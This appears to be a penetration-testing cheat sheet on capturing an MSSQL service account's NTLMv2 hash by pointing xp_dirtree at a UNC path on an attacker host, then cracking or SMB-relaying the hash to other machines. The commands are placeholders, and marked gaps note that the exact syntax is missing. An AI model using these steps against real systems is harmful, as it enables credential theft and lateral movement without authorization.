1. Establish direct connection to MSSQL or identify SQL injection in a web application.
2. Set up a listener (Responder, WireShark, or TCPDump) on `<ATTACK_IP>` to intercept incoming traffic.
3. Execute `xp_dirtree` targeting a UNC path on the controlled host to trigger the NTLMv2 hash leak.
4. Capture the hash and decide between local cracking or SMB Relay to secondary targets.

---

## Forced NTLMv2 Leak via xp_dirtree

**When to use** Direct interaction with MSSQL or SQLi in web applications on Windows hosts where you need to capture the service account hash.

**Commands** Specify the function and the target network folder to initiate the authentication cycle.

```
xp_dirtree \\<ATTACK_IP>\<SHARE_NAME> <DEPTH>
```

> ⚠️ **Gap**: Source mentions the function and parameters (depth, target folder) but does not provide the exact T-SQL `EXEC` syntax or specific capture tool flags.

**Tool comparison**

- Responder
    - Intercepts and displays hashes automatically
    - Prefer for standard NTLMv2 capture and parsing
- WireShark / TCPDump
    - Captures raw traffic for manual analysis
    - Prefer when automated tools fail or detailed packet inspection is required

**Dangerous / misconfigured settings**

- MSSQL service running with **elevated privileges** allows system command execution.
- MSSQL server configured to allow undocumented functions like `xp_dirtree`.

**Gotchas** **SMB Relay to the originating host is patched**; the captured hash must be used against other systems where the account has **local admin privileges**.

## NTLMv2 Hash Exploitation

**When to use** NTLMv2 hash successfully intercepted from the MSSQL service user.

**Commands** Replay the hash to secondary systems for administrative access.

```
<SMB_RELAY_TOOL> -t <TARGET_IP>
```

> ⚠️ **Gap**: Source mentions the concept of SMB Relay and cracking but provides no specific tool syntax or cracking commands.

**Edge cases**

- If SMB Relay targets lack **local admin privileges**, the attack will fail to grant system access.
- If the password is high-entropy, **cracking on the local system** may be unsuccessful.

**Gotchas** **Successful SMB Relay does not guarantee access to the original host**; use gained access on secondary hosts to pivot or steal credentials for the original system.

## Alternative Command Execution

**When to use** Direct command execution is required and `xp_dirtree` is insufficient.

**Commands** Execute Python code within a SQL query if the environment supports it.

```
<SQL_QUERY_WITH_PYTHON_CODE>
```

> ⚠️ **Gap**: Source identifies Python execution as an alternative method but provides no syntax or configuration requirements.